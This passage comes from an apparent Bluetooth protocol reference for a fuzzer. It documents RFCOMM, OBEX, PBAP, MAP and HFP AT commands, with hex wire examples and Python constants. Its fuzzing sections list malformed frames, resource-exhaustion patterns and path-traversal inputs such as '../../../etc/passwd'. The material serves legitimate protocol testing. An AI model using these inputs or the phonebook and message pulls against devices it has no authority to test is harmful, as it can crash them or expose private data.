|---------|-------------|
| PN (Parameter Negotiation) | Negotiate DLCI parameters before SABM |
| MSC (Modem Status Command) | Virtual modem signals (DV, IC, RTR, RTC, FC) |
| RPN (Remote Port Negotiation) | Baud rate, data bits, stop bits, parity |
| RLS (Remote Line Status) | Error conditions (overrun, parity, framing) |

### 4.3 Fuzzing Attack Surface

**Via raw L2CAP PSM 3 (bypassing kernel RFCOMM):**

```python
RFCOMM_FRAME_FUZZ = {
    # Wrong FCS
    "bad_fcs": b"\x03\x3f\x01\x00\x00",       # SABM DLCI 0 with wrong FCS

    # Length=0 UIH
    "zero_len_uih": b"\x03\xef\x01\x00",       # UIH DLCI 0, length 0

    # Length > MTU
    "oversized_len": b"\x03\xef\x00\xff\x7f",  # UIH with 2-byte len = 16383

    # SABM on non-existent DLCI without prior PN
    "sabm_no_pn": b"\xfb\x3f\x01",             # SABM DLCI 62 (max) + FCS

    # Data on DLCI 0 (should only carry MUX commands)
    "data_on_dlci0": b"\x03\xef\x05AAAA",      # UIH DLCI 0 with raw data

    # Invalid control byte
    "bad_control": b"\x03\xaa\x01\x00",         # Unknown control value 0xAA

    # MSC on unopened DLCI
    "msc_no_dlci": b"\x03\xef\x09\xe3\x05\x03\x8d",

    # PN with invalid parameters
    "pn_bad_params": b"\x03\xef\x11\x83\x11\x09"
                     b"\x00\x00\xff\xff\xff\x00\x00\x00\x00\x00\x00",
}
```

**Key fuzzing insight**: From user-space, you cannot send raw RFCOMM frames through `BTPROTO_RFCOMM` sockets. The kernel builds frames. To fuzz RFCOMM framing itself, send crafted bytes over a raw L2CAP PSM 3 socket using the existing `L2CAPFuzzer` infrastructure.

---

## 5. OBEX (Object Exchange)

OBEX is a binary request-response protocol used by PBAP, MAP, and OPP over RFCOMM. All multi-byte fields are **big-endian**.

### 5.1 Packet Format

```
+----------+----------------+--------------------+
| Opcode   | Packet Length  | Headers (optional) |
| 1 byte   | 2 bytes BE     | variable           |
+----------+----------------+--------------------+
```

- **Minimum packet**: 3 bytes (opcode + 2-byte length)
- **Maximum packet**: 65535 bytes (`0xFFFF`)
- **Packet Length**: INCLUSIVE of the opcode byte and 2 length bytes

Python struct: `struct.pack('>BH', opcode, packet_length)`

**Request Opcodes:**

| Opcode | Hex | Description | Final Bit |
|--------|-----|-------------|-----------|
| Connect | `0x80` | Establish OBEX session | Always final |
| Disconnect | `0x81` | Tear down session | Always final |
| Put | `0x02` | Send object (intermediate) | Not final |
| Put Final | `0x82` | Send object (last packet) | Final |
| Get | `0x03` | Request object (intermediate) | Not final |
| Get Final | `0x83` | Request object (last packet) | Final |
| SetPath | `0x85` | Change current folder | Always final |
| Abort | `0xFF` | Abort current operation | Always final |

The Final Bit is bit 7 (`0x80`) of the opcode. Connect (`0x80`), Disconnect (`0x81`), SetPath (`0x85`), and Abort (`0xFF`) always have it set. Put and Get use it to distinguish intermediate (`0x02`/`0x03`) from final (`0x82`/`0x83`) packets.

**Response Codes (all have Final bit `0x80` set):**

| Code | Hex | Category |
|------|-----|----------|
| Continue | `0x90` | Informational |
| OK / Success | `0xA0` | Success |
| Created | `0xA1` | Success |
| Accepted | `0xA2` | Success |
| Non-Authoritative | `0xA3` | Success |
| No Content | `0xA4` | Success |
| Reset Content | `0xA5` | Success |
| Partial Content | `0xA6` | Success |
| Multiple Choices | `0xB0` | Redirection |
| Moved Permanently | `0xB1` | Redirection |
| Moved Temporarily | `0xB2` | Redirection |
| See Other | `0xB3` | Redirection |
| Not Modified | `0xB4` | Redirection |
| Use Proxy | `0xB5` | Redirection |
| Bad Request | `0xC0` | Client Error |
| Unauthorized | `0xC1` | Client Error |
| Payment Required | `0xC2` | Client Error |
| Forbidden | `0xC3` | Client Error |
| Not Found | `0xC4` | Client Error |
| Method Not Allowed | `0xC5` | Client Error |
| Not Acceptable | `0xC6` | Client Error |
| Proxy Auth Required | `0xC7` | Client Error |
| Request Timeout | `0xC8` | Client Error |
| Conflict | `0xC9` | Client Error |
| Gone | `0xCA` | Client Error |
| Length Required | `0xCB` | Client Error |
| Precondition Failed | `0xCC` | Client Error |
| Entity Too Large | `0xCD` | Client Error |
| Request URL Too Large | `0xCE` | Client Error |
| Unsupported Media Type | `0xCF` | Client Error |
| Internal Server Error | `0xD0` | Server Error |
| Not Implemented | `0xD1` | Server Error |
| Bad Gateway | `0xD2` | Server Error |
| Service Unavailable | `0xD3` | Server Error |
| Gateway Timeout | `0xD4` | Server Error |
| HTTP Version Not Supported | `0xD5` | Server Error |
| Database Full | `0xE0` | OBEX-Specific |
| Database Locked | `0xE1` | OBEX-Specific |

### 5.2 Header Format

**Header ID (HI) Byte Encoding:**

```
  Bits 7-6: Type encoding
  Bits 5-0: Header meaning

  +----+----+----+----+----+----+----+----+
  | T1 | T0 | M5 | M4 | M3 | M2 | M1 | M0 |
  +----+----+----+----+----+----+----+----+
```

| Bits 7-6 | Mask | Type | Format |
|----------|------|------|--------|
| `0b00` | `0x00` | Unicode text | HI(1) + Length(2 BE) + UTF-16BE data (null-terminated) |
| `0b01` | `0x40` | Byte sequence | HI(1) + Length(2 BE) + raw bytes |
| `0b10` | `0x80` | 1-byte value | HI(1) + Value(1) -- total 2 bytes, NO length field |
| `0b11` | `0xC0` | 4-byte value | HI(1) + Value(4) -- total 5 bytes, NO length field |

**CRITICAL**: For Unicode (`0x00`) and Byte sequence (`0x40`) headers, the 2-byte Length field is **inclusive** of the HI byte and the length bytes themselves. Minimum valid length = 3.

**Standard Header IDs:**

| Header | HI | Type | Description |
|--------|-----|------|-------------|
| Count | `0xC0` | 4-byte | Number of objects |
| Name | `0x01` | Unicode | Object name (UTF-16BE, null-terminated) |
| Type | `0x42` | Byte seq | MIME type (ASCII, null-terminated) |
| Length | `0xC3` | 4-byte | Object size in bytes |
| Time (ISO 8601) | `0x44` | Byte seq | Timestamp string |
| Description | `0x05` | Unicode | Text description |
| Target | `0x46` | Byte seq | Service UUID for directed connection |
| HTTP | `0x47` | Byte seq | HTTP headers |
| Body | `0x48` | Byte seq | Object body chunk |
| End-of-Body | `0x49` | Byte seq | Final object body chunk |
| Who | `0x4A` | Byte seq | Identifies OBEX server |
| Connection-ID | `0xCB` | 4-byte | Connection multiplexing token |
| App-Parameters | `0x4C` | Byte seq | Profile-specific TLV parameters |
| Auth-Challenge | `0x4D` | Byte seq | Authentication challenge |
| Auth-Response | `0x4E` | Byte seq | Authentication response |
| Object-Class | `0x51` | Byte seq | OBEX object class |

**Rule**: It is illegal to send Connection-ID (`0xCB`) and Target (`0x46`) in the same request.

**Wire Format Examples:**

Unicode header (Name = "pb.vcf"):
```
01              -- HI: Name (Unicode)
00 11           -- Length: 17 bytes (1 + 2 + 12 chars + 2 null)
00 70 00 62 00  -- "pb.vcf" in UTF-16BE
2E 00 76 00 63
00 66 00 00     -- null terminator (00 00)
```

Byte sequence header (Type = "x-bt/phonebook"):
```
42              -- HI: Type (byte sequence)
00 12           -- Length: 18 = 1 + 2 + 15 bytes (includes null)
78 2D 62 74 2F  -- "x-bt/phonebook\0" in ASCII
70 68 6F 6E 65
62 6F 6F 6B 00
```

4-byte header (Connection-ID = 1):
```
CB              -- HI: Connection-ID (4-byte)
00 00 00 01     -- Value: 1
```
No length field -- always exactly 5 bytes total.

### 5.3 Connect/SetPath Specifics

**Connect Request:**

```
+--------+----------------+--------+--------+-----------+----------+
| Opcode | Packet Length   | Version| Flags  | MaxPktLen | Headers  |
| 0x80   | 2 bytes BE     | 1 byte | 1 byte | 2 bytes BE|          |
+--------+----------------+--------+--------+-----------+----------+
```

- **Version**: `0x10` for OBEX 1.0 (upper nibble = major, lower = minor)
- **Flags**: `0x00` (reserved, must be zero)
- **MaxPacketLength**: Max OBEX packet size client can receive (typically `0xFFFF`)
- **Minimum Connect packet**: 7 bytes

Connect Response has same extra fields (Version + Flags + MaxPktLen). Server may include Connection-ID header (`0xCB`) that client must use in all subsequent requests.

**SetPath Request:**

```
+--------+----------------+-------+-----------+----------+
| Opcode | Packet Length   | Flags | Constants | Headers  |
| 0x85   | 2 bytes BE     | 1 byte| 1 byte    | (Name)   |
+--------+----------------+-------+-----------+----------+
```

- **Flags byte**:
  - Bit 0: Backup a level before applying Name (`cd ..` then `cd name`)
  - Bit 1: Don't create folder if it doesn't exist
  - Bits 2-7: Reserved (must be zero)
- **Constants**: Reserved, must be `0x00`

| Flags | Name Header | Effect |
|-------|-------------|--------|
| `0x00` | "telecom" | `cd telecom` |
| `0x02` | (none) | `cd ..` |
| `0x03` | "pb" | `cd ../pb` |
| `0x02` | "" (empty) | Reset to root |

### 5.4 PBAP Profile Details

**PBAP Target UUID (16 bytes):**
```
79 61 35 F0 F0 C5 11 D8 09 66 08 00 20 0C 9A 66
```
String: `796135f0-f0c5-11d8-0966-0800200c9a66`

Goes in Target header (`0x46`) of OBEX Connect request.

**PBAP Type Headers:**

| Type String | Purpose |
|-------------|---------|
| `x-bt/phonebook` | Pull phonebook (PullPhoneBook) |
| `x-bt/vcard-listing` | List vCard entries (PullvCardListing) |
| `x-bt/vcard` | Pull single vCard (PullvCardEntry) |

**PBAP Folder Structure:**

```
root/
  telecom/
    pb.vcf          -- main phonebook
    ich.vcf         -- incoming call history
    och.vcf         -- outgoing call history
    mch.vcf         -- missed call history
    cch.vcf         -- combined call history
    spd.vcf         -- speed dial
    fav.vcf         -- favorites
  SIM1/
    telecom/
      pb.vcf
      ich.vcf  ...
```

**PBAP Application Parameters (TLV inside App-Parameters header `0x4C`):**

Each TLV: Tag(1) + Length(1) + Value(N)

| Tag | Hex | Name | Length | Value Type |
|-----|-----|------|--------|------------|
| Order | `0x01` | Sort order | 1 | 0x00=Indexed, 0x01=Alpha, 0x02=Phonetic |
| SearchValue | `0x02` | Search string | var | UTF-8 text |
| SearchAttribute | `0x03` | Search field | 1 | 0x00=Name, 0x01=Number, 0x02=Sound |
| MaxListCount | `0x04` | Max entries | 2 | uint16 BE (0=get size only) |
| ListStartOffset | `0x05` | Starting offset | 2 | uint16 BE |
| Filter | `0x06` | vCard property filter | 8 | uint64 BE bitmask |
| Format | `0x07` | vCard format | 1 | 0x00=vCard 2.1, 0x01=vCard 3.0 |
| PhonebookSize | `0x08` | Size (response) | 2 | uint16 BE |
| NewMissedCalls | `0x09` | Missed calls (response) | 1 | uint8 |
| PrimaryVersionCounter | `0x0A` | Primary folder version | 16 | 128-bit |
| SecondaryVersionCounter | `0x0B` | Secondary folder version | 16 | 128-bit |
| vCardSelector | `0x0C` | Select matching properties | 8 | uint64 BE bitmask |
| DatabaseIdentifier | `0x0D` | Database ID | 16 | 128-bit |
| vCardSelectorOperator | `0x0E` | AND/OR | 1 | 0x00=OR, 0x01=AND |
| ResetNewMissedCalls | `0x0F` | Reset counter | 1 | 0x01=reset |
| PbapSupportedFeatures | `0x10` | Features bitmask | 4 | uint32 BE |

**PBAP Filter Bitmask (tags `0x06` and `0x0C`):**

| Bit | vCard Property |
|-----|---------------|
| 0 | VERSION |
| 1 | FN (Formatted Name) |
| 2 | N (Name) |
| 3 | PHOTO |
| 4 | BDAY |
| 5 | ADR |
| 6 | LABEL |
| 7 | TEL |
| 8 | EMAIL |
| 9 | MAILER |
| 10 | TZ |
| 11 | GEO |
| 12 | TITLE |
| 13 | ROLE |
| 14 | LOGO |
| 15 | AGENT |
| 16 | ORG |
| 17 | NOTE |
| 18 | REV |
| 19 | SOUND |
| 20 | URL |
| 21 | UID |
| 22 | KEY |
| 23 | NICKNAME |
| 24 | CATEGORIES |
| 25 | PROID |
| 26 | CLASS |
| 27 | SORT-STRING |
| 28 | X-IRMC-CALL-DATETIME |
| 29-63 | Reserved |

**Hex Example -- PBAP Connect + PullPhoneBook:**

Client Connect:
```
80                          -- Opcode: Connect
00 1A                       -- Packet Length: 26
10                          -- OBEX Version 1.0
00                          -- Flags: 0
FF FF                       -- MaxPacketLength: 65535
46                          -- Header: Target (byte seq)
00 13                       -- Header Length: 19 (1+2+16)
79 61 35 F0 F0 C5 11 D8    -- PBAP UUID
09 66 08 00 20 0C 9A 66
```

Server Connect Success:
```
A0                          -- Response: Success
00 0C                       -- Packet Length: 12
10                          -- OBEX Version 1.0
00                          -- Flags: 0
FF FF                       -- MaxPacketLength: 65535
CB                          -- Header: Connection-ID
00 00 00 01                 -- Value: 1
```

Client Get Final (PullPhoneBook "pb.vcf"):
```
83                          -- Opcode: Get Final
00 30                       -- Packet Length: 48
CB                          -- Header: Connection-ID
00 00 00 01                 -- Value: 1
01                          -- Header: Name (Unicode)
00 11                       -- Header Length: 17
00 70 00 62 00 2E 00 76     -- "pb.vcf" UTF-16BE
00 63 00 66 00 00           -- + null terminator
42                          -- Header: Type (byte seq)
00 11                       -- Header Length: 17
78 2D 62 74 2F 70 68 6F     -- "x-bt/phonebook\0"
6E 65 62 6F 6F 6B 00
4C                          -- Header: App-Parameters
00 09                       -- Header Length: 9
04 02 FF FF                 -- MaxListCount: Tag=0x04, Len=2, Value=65535
05 02 00 00                 -- ListStartOffset: Tag=0x05, Len=2, Value=0
```

### 5.5 MAP Profile Details

**MAP Target UUIDs:**

MAS (Message Access Server):
```
BB 58 2B 40 42 0C 11 DB B0 DE 08 00 20 0C 9A 66
```
String: `bb582b40-420c-11db-b0de-0800200c9a66`

MNS (Message Notification Server):
```
BB 58 2B 41 42 0C 11 DB B0 DE 08 00 20 0C 9A 66
```
String: `bb582b41-420c-11db-b0de-0800200c9a66`

MAS and MNS UUIDs differ only in the 4th byte (`0x40` vs `0x41`).

**MAP Type Headers:**

| Type String | Purpose |
|-------------|---------|
| `x-obex/folder-listing` | List folders |
| `x-bt/MAP-msg-listing` | List messages in folder |
| `x-bt/message` | Get/push message (bMessage format) |
| `x-bt/MAP-NotificationRegistration` | Register for notifications |
| `x-bt/messageStatus` | Set message read/delete status |
| `x-bt/MAP-messageUpdate` | Update inbox |
| `x-bt/MASInstanceInformation` | Get MAS instance info |
| `x-bt/MAP-notification-filter` | Set notification filter |

**MAP Folder Structure:**

```
root/
  telecom/
    msg/
      inbox/
      outbox/
      sent/
      deleted/
      draft/
```

**MAP Application Parameters (TLV):**

| Tag | Hex | Name | Length | Value Type |
|-----|-----|------|--------|------------|
| MaxListCount | `0x01` | Max entries | 2 | uint16 BE |
| StartOffset | `0x02` | List start | 2 | uint16 BE |
| FilterMessageType | `0x03` | Message type filter | 1 | bitmask |
| FilterPeriodBegin | `0x04` | Start time | var | UTF-8 timestamp |
| FilterPeriodEnd | `0x05` | End time | var | UTF-8 timestamp |
| FilterReadStatus | `0x06` | Read status | 1 | bitmask |
| FilterRecipient | `0x07` | Recipient | var | UTF-8 |
| FilterOriginator | `0x08` | Sender | var | UTF-8 |
| FilterPriority | `0x09` | Priority | 1 | bitmask |
| Attachment | `0x0A` | Include attachments | 1 | 0x00=off, 0x01=on |
| Transparent | `0x0B` | Transparent push | 1 | 0x00=off, 0x01=on |
| Retry | `0x0C` | Retry sending | 1 | 0x00=off, 0x01=on |
| NewMessage | `0x0D` | New message flag | 1 | 0x00=no, 0x01=yes |
| NotificationStatus | `0x0E` | Registration status | 1 | 0x00=off, 0x01=on |
| MASInstanceID | `0x0F` | MAS instance ID | 1 | uint8 |
| ParameterMask | `0x10` | Attribute filter | 4 | uint32 BE bitmask |
| FolderListingSize | `0x11` | Folder count (resp) | 2 | uint16 BE |
| MessagesListingSize | `0x12` | Message count (resp) | 2 | uint16 BE |
| SubjectLength | `0x13` | Max subject chars | 1 | uint8 (1-255) |
| Charset | `0x14` | Character set | 1 | 0x00=native, 0x01=UTF-8 |
| FractionRequest | `0x15` | Fraction request | 1 | 0x00=first, 0x01=next |
| FractionDeliver | `0x16` | Fraction delivery | 1 | 0x00=more, 0x01=last |
| StatusIndicator | `0x17` | Status type | 1 | 0x00=read, 0x01=delete |
| StatusValue | `0x18` | Status value | 1 | 0x00=no, 0x01=yes |
| MSETime | `0x19` | Server timestamp | var | UTF-8 timestamp |

**MAP ParameterMask Bits:**

| Bit | Attribute |
|-----|-----------|
| 0x0001 | Subject |
| 0x0002 | Datetime |
| 0x0004 | Sender Name |
| 0x0008 | Sender Addressing |
| 0x0010 | Recipient Name |
| 0x0020 | Recipient Addressing |
| 0x0040 | Type |
| 0x0080 | Size |
| 0x0100 | Reception Status |
| 0x0200 | Text |
| 0x0400 | Attachment Size |
| 0x0800 | Priority |
| 0x1000 | Read |
| 0x2000 | Sent |
| 0x4000 | Protected |
| 0x8000 | Reply-To Addressing |

**Hex Example -- MAP Connect + Get Message Listing:**

Client Connect:
```
80                          -- Connect
00 1A                       -- Length: 26
10 00 FF FF                 -- Version 1.0, Flags 0, MaxPkt 65535
46                          -- Target
00 13                       -- Header Length: 19
BB 58 2B 40 42 0C 11 DB    -- MAP MAS UUID
B0 DE 08 00 20 0C 9A 66
```

SetPath to "telecom/msg/inbox" (3 operations):
```
85 00 16 02 00 01 00 12 00 74 00 65 00 6C 00 65 00 63 00 6F 00 6D 00 00
85 00 0E 02 00 01 00 0A 00 6D 00 73 00 67 00 00
85 00 12 02 00 01 00 0E 00 69 00 6E 00 62 00 6F 00 78 00 00
```

Get Final (message listing):
```
83                          -- Get Final
00 2B                       -- Length: 43
CB 00 00 00 01              -- Connection-ID: 1
42                          -- Type
00 18                       -- Length: 24
78 2D 62 74 2F 4D 41 50     -- "x-bt/MAP-msg-listing\0"
2D 6D 73 67 2D 6C 69 73
74 69 6E 67 00
4C                          -- App-Parameters
00 09                       -- Length: 9
01 02 00 0A                 -- MaxListCount: 10
13 01 1E                    -- SubjectLength: 30
```

### 5.6 Fuzzing Attack Surface

**Packet-Level:**

| Attack | Hex Example |
|--------|-------------|
| Zero-length packet | `80 00 00` (length=0) |
| Length = 1 | `80 00 01` |
| Length = 2 | `80 00 02` |
| Length < actual | Set length to 3, include headers |
| Length > actual | `80 FF FF` + tiny packet |
| Unknown opcode | `0x04`, `0x05`, `0x06`... `0x7F` |
| Opcode 0x00 | `00 00 03` |
| Connect MaxPktLen=0 | `80 00 07 10 00 00 00` |
| Connect MaxPktLen=1 | `80 00 07 10 00 00 01` |
| Connect bad version | `80 00 07 FF 00 FF FF` |

**Header-Level:**

| Attack | Hex Example |
|--------|-------------|
| Header Length = 0 | `01 00 00` |
| Header Length = 1 | `01 00 01` |
| Header Length = 2 | `01 00 02` |
| Unicode odd byte count | `01 00 06 00 41 42` (3 value bytes) |
| Unicode missing null | `01 00 05 00 41` |
| Byte seq huge length | `42 FF FF 41 42` |
| 4-byte header truncated | `CB 00 00 01` (only 3 bytes) |
| Multiple Connection-ID | `CB 00 00 00 01 CB 00 00 00 02` |
| Name with path traversal | `../../../etc/passwd` in UTF-16BE |
| Name with embedded nulls | `01 00 09 00 41 00 00 00 42 00 00` |
| Empty Name | `01 00 05 00 00` |
| Target wrong UUID length | `46 00 05 AA BB` (2-byte UUID) |
| Target oversized | `46 01 03 ...` (256+ bytes) |
| Both Target and Connection-ID | Violates OBEX rule |

**App-Parameters TLV:**

| Attack | Hex Example |
|--------|-------------|
| TLV Length > remaining | `4C 00 06 04 FF AA` |
| TLV Length = 0 | `4C 00 05 04 00` |
| Unknown tag | `4C 00 05 FF 01 AA` |
| Duplicate tags | `4C 00 0B 04 02 00 01 04 02 00 02` |
| MaxListCount = `0xFFFF` | Tag `0x04`, Value `FF FF` |
| Filter = all bits | Tag `0x06`, Value `FF FF FF FF FF FF FF FF` |
| Format = invalid | Tag `0x07`, Value `0xFF` |
| SearchValue 10KB | Tag `0x02`, Len=max, huge UTF-8 |
| Wrong length for fixed tags | MaxListCount with 1 byte: `04 01 FF` |

**Session-Level:**

| Attack | Description |
|--------|-------------|
| Get without Connect | Send Get Final before session |
| Put after Disconnect | Send Put after teardown |
| Double Connect | Connect twice |
| Abort without operation | Abort when idle |
| Interleave Put and Get | Mixed operations |
| Connection-ID from different session | Replay stale IDs |
| MaxPacketLength violation | Packet larger than negotiated |
| Rapid connect/disconnect | Resource exhaustion |
| Deep SetPath nesting | 1000+ nested folders |
| SetPath path traversal | `../../../etc/passwd` |

### 5.7 Python Constants for Implementation

```python
# OBEX Opcodes
OBEX_CONNECT    = 0x80
OBEX_DISCONNECT = 0x81
OBEX_PUT        = 0x02
OBEX_PUT_FINAL  = 0x82
OBEX_GET        = 0x03
OBEX_GET_FINAL  = 0x83
OBEX_SETPATH    = 0x85
OBEX_ABORT      = 0xFF

# OBEX Response Codes
OBEX_CONTINUE       = 0x90
OBEX_SUCCESS        = 0xA0
OBEX_BAD_REQUEST    = 0xC0
OBEX_UNAUTHORIZED   = 0xC1
OBEX_FORBIDDEN      = 0xC3
OBEX_NOT_FOUND      = 0xC4
OBEX_NOT_ACCEPTABLE = 0xC6
OBEX_PRECON_FAILED  = 0xCC
OBEX_INTERNAL_ERROR = 0xD0
OBEX_NOT_IMPLEMENTED= 0xD1
OBEX_UNAVAILABLE    = 0xD3
OBEX_DATABASE_FULL  = 0xE0
OBEX_DATABASE_LOCKED= 0xE1

# Header IDs
HI_COUNT          = 0xC0  # 4-byte
HI_NAME           = 0x01  # Unicode
HI_TYPE           = 0x42  # Byte seq
HI_LENGTH         = 0xC3  # 4-byte
HI_TIME           = 0x44  # Byte seq
HI_DESCRIPTION    = 0x05  # Unicode
HI_TARGET         = 0x46  # Byte seq
HI_HTTP           = 0x47  # Byte seq
HI_BODY           = 0x48  # Byte seq
HI_END_OF_BODY    = 0x49  # Byte seq
HI_WHO            = 0x4A  # Byte seq
HI_CONNECTION_ID  = 0xCB  # 4-byte
HI_APP_PARAMS     = 0x4C  # Byte seq
HI_AUTH_CHALLENGE = 0x4D  # Byte seq
HI_AUTH_RESPONSE  = 0x4E  # Byte seq
HI_OBJECT_CLASS   = 0x51  # Byte seq

# Header type masks
HI_MASK           = 0xC0
HI_UNICODE        = 0x00  # top 2 bits = 00
HI_BYTESEQ        = 0x40  # top 2 bits = 01
HI_BYTE1          = 0x80  # top 2 bits = 10
HI_BYTE4          = 0xC0  # top 2 bits = 11

# Profile Target UUIDs (16 bytes each)
PBAP_TARGET_UUID = bytes([
    0x79, 0x61, 0x35, 0xF0, 0xF0, 0xC5, 0x11, 0xD8,
    0x09, 0x66, 0x08, 0x00, 0x20, 0x0C, 0x9A, 0x66
])
MAP_MAS_TARGET_UUID = bytes([
    0xBB, 0x58, 0x2B, 0x40, 0x42, 0x0C, 0x11, 0xDB,
    0xB0, 0xDE, 0x08, 0x00, 0x20, 0x0C, 0x9A, 0x66
])
MAP_MNS_TARGET_UUID = bytes([
    0xBB, 0x58, 0x2B, 0x41, 0x42, 0x0C, 0x11, 0xDB,
    0xB0, 0xDE, 0x08, 0x00, 0x20, 0x0C, 0x9A, 0x66
])
FTP_TARGET_UUID = bytes([
    0xF9, 0xEC, 0x7B, 0xC4, 0x95, 0x3C, 0x11, 0xD2,
    0x98, 0x4E, 0x52, 0x54, 0x00, 0xDC, 0x9E, 0x09
])

# PBAP Application Parameter Tags
PBAP_TAG_ORDER              = 0x01  # 1 byte
PBAP_TAG_SEARCH_VALUE       = 0x02  # variable
PBAP_TAG_SEARCH_ATTRIBUTE   = 0x03  # 1 byte
PBAP_TAG_MAX_LIST_COUNT     = 0x04  # 2 bytes
PBAP_TAG_LIST_START_OFFSET  = 0x05  # 2 bytes
PBAP_TAG_FILTER             = 0x06  # 8 bytes
PBAP_TAG_FORMAT             = 0x07  # 1 byte
PBAP_TAG_PHONEBOOK_SIZE     = 0x08  # 2 bytes
PBAP_TAG_NEW_MISSED_CALLS   = 0x09  # 1 byte
PBAP_TAG_PRIMARY_VERSION    = 0x0A  # 16 bytes
PBAP_TAG_SECONDARY_VERSION  = 0x0B  # 16 bytes
PBAP_TAG_VCARD_SELECTOR     = 0x0C  # 8 bytes
PBAP_TAG_DATABASE_ID        = 0x0D  # 16 bytes
PBAP_TAG_VCARD_SEL_OP       = 0x0E  # 1 byte
PBAP_TAG_RESET_MISSED       = 0x0F  # 1 byte
PBAP_TAG_SUPPORTED_FEATURES = 0x10  # 4 bytes

# MAP Application Parameter Tags
MAP_TAG_MAX_LIST_COUNT      = 0x01  # 2 bytes
MAP_TAG_START_OFFSET        = 0x02  # 2 bytes
MAP_TAG_FILTER_MSG_TYPE     = 0x03  # 1 byte
MAP_TAG_FILTER_PERIOD_BEGIN = 0x04  # variable
MAP_TAG_FILTER_PERIOD_END   = 0x05  # variable
MAP_TAG_FILTER_READ_STATUS  = 0x06  # 1 byte
MAP_TAG_FILTER_RECIPIENT    = 0x07  # variable
MAP_TAG_FILTER_ORIGINATOR   = 0x08  # variable
MAP_TAG_FILTER_PRIORITY     = 0x09  # 1 byte
MAP_TAG_ATTACHMENT          = 0x0A  # 1 byte
MAP_TAG_TRANSPARENT         = 0x0B  # 1 byte
MAP_TAG_RETRY               = 0x0C  # 1 byte
MAP_TAG_NEW_MESSAGE         = 0x0D  # 1 byte
MAP_TAG_NOTIFICATION_STATUS = 0x0E  # 1 byte
MAP_TAG_MAS_INSTANCE_ID     = 0x0F  # 1 byte
MAP_TAG_PARAMETER_MASK      = 0x10  # 4 bytes
MAP_TAG_FOLDER_LISTING_SIZE = 0x11  # 2 bytes
MAP_TAG_MSG_LISTING_SIZE    = 0x12  # 2 bytes
MAP_TAG_SUBJECT_LENGTH      = 0x13  # 1 byte
MAP_TAG_CHARSET             = 0x14  # 1 byte
MAP_TAG_FRACTION_REQUEST    = 0x15  # 1 byte
MAP_TAG_FRACTION_DELIVER    = 0x16  # 1 byte
MAP_TAG_STATUS_INDICATOR    = 0x17  # 1 byte
MAP_TAG_STATUS_VALUE        = 0x18  # 1 byte
MAP_TAG_MSE_TIME            = 0x19  # variable

# PBAP Type strings
PBAP_TYPE_PHONEBOOK   = b"x-bt/phonebook"
PBAP_TYPE_VCARD_LIST  = b"x-bt/vcard-listing"
PBAP_TYPE_VCARD       = b"x-bt/vcard"

# MAP Type strings
MAP_TYPE_FOLDER_LIST  = b"x-obex/folder-listing"
MAP_TYPE_MSG_LISTING  = b"x-bt/MAP-msg-listing"
MAP_TYPE_MESSAGE      = b"x-bt/message"
MAP_TYPE_NOTIF_REG    = b"x-bt/MAP-NotificationRegistration"
MAP_TYPE_MSG_STATUS   = b"x-bt/messageStatus"
MAP_TYPE_MSG_UPDATE   = b"x-bt/MAP-messageUpdate"
```

---

## 6. AT Commands (HFP / Phonebook / SMS)

AT commands are sent as ASCII text over RFCOMM. Every command ends with `\r` (`0x0D`). Responses are wrapped in `\r\n`. Fuzzable from user-space RFCOMM sockets.

### 6.1 HFP Service Level Connection Sequence

The SLC must be established before any call operations:

| Step | HF Sends | AG Responds | Notes |
|------|----------|-------------|-------|
| 1 | `AT+BRSF=<hf_features>\r` | `+BRSF:<ag_features>` then `OK` | Mandatory. Feature bitmask exchange. |
| 2 | `AT+BAC=1,2\r` | `OK` | Codec negotiation (HFP 1.6+). 1=CVSD, 2=mSBC. |
| 3 | `AT+CIND=?\r` | `+CIND:("service",(0,1)),("call",(0,1)),...` then `OK` | Mandatory. Indicator mapping. |
| 4 | `AT+CIND?\r` | `+CIND:1,0,0,3,0,5,0` then `OK` | Mandatory. Current values. |
| 5 | `AT+CMER=3,0,0,1\r` | `OK` | Mandatory. Enable unsolicited reporting. |
| 6 | `AT+CHLD=?\r` | `+CHLD:(0,1,1x,2,2x,3,4)` then `OK` | Mandatory if 3-way calling. |
| 7 | `AT+BIND=1,2\r` | `OK` | HFP 1.7+. HF indicators (battery, safety). |
| 8 | `AT+BIND?\r` | `+BIND:1,1` then `+BIND:2,1` then `OK` | Query indicator status. |

### 6.2 HFP Feature Bitmasks

**HF Features (AT+BRSF argument):**

| Bit | Feature |
|-----|---------|
| 0 | EC and/or NR function |
| 1 | Three-way calling |
| 2 | CLI presentation capability |
| 3 | Voice recognition activation |
| 4 | Remote volume control |
| 5 | Enhanced call status |
| 6 | Enhanced call control |
| 7 | Codec negotiation |
| 8 | HF Indicators |
| 9 | eSCO S4 (T2) Settings |

**AG Features (+BRSF response):**

| Bit | Feature |
|-----|---------|
| 0 | Three-way calling |
| 1 | EC and/or NR function |
| 2 | Voice recognition |
| 3 | In-band ring tone |
| 4 | Attach number to voice tag |
| 5 | Ability to reject call |
| 6 | Enhanced call status |
| 7 | Enhanced call control |
| 8 | Extended error result codes |
| 9 | Codec negotiation |
| 10 | HF Indicators |
| 11 | eSCO S4 (T2) Settings |

### 6.3 Call Control Commands

| Command | Direction | Description |
|---------|-----------|-------------|
| `ATD<number>;` | HF->AG | Dial (semicolon required for voice) |
| `ATD><memory><index>;` | HF->AG | Memory dial (e.g., `ATD>SM1;`) |
| `ATA` | HF->AG | Answer incoming call |
| `AT+CHUP` | HF->AG | Hang up current call |
| `AT+CHLD=<action>` | HF->AG | Call hold: 0=release held, 1=release active+accept, 2=hold+accept, 3=conference, 4=ECT |
| `AT+CHLD=1<idx>` | HF->AG | Release specific call by index |
| `AT+CHLD=2<idx>` | HF->AG | Private consultation with specific call |
| `AT+CLCC` | HF->AG | List current calls |
| `AT+VTS=<dtmf>` | HF->AG | Send DTMF tone (0-9, *, #, A-D) |
| `AT+BLDN` | HF->AG | Last number redial |
| `AT+BVRA=<0/1>` | HF->AG | Voice recognition on/off |

**Status/Query Commands:**

| Command | Description |
|---------|-------------|
| `AT+COPS=3,0` then `AT+COPS?` | Network operator name |
| `AT+CNUM` | Subscriber number |
| `AT+VGS=<0-15>` | Speaker volume |
| `AT+VGM=<0-15>` | Microphone volume |
| `AT+CLIP=1` | Enable calling line ID |
| `AT+CCWA=1` | Enable call waiting |
| `AT+CMEE=1` | Enable extended error codes |
| `AT+NREC=0` | Disable NR/EC |
| `AT+BSIR=<0/1>` | In-band ring tone (AG->HF) |
| `AT+BINP=1` | Request phone number for voice tag |

### 6.4 Phonebook AT Commands (3GPP TS 27.007)

| Command | Description | Example |
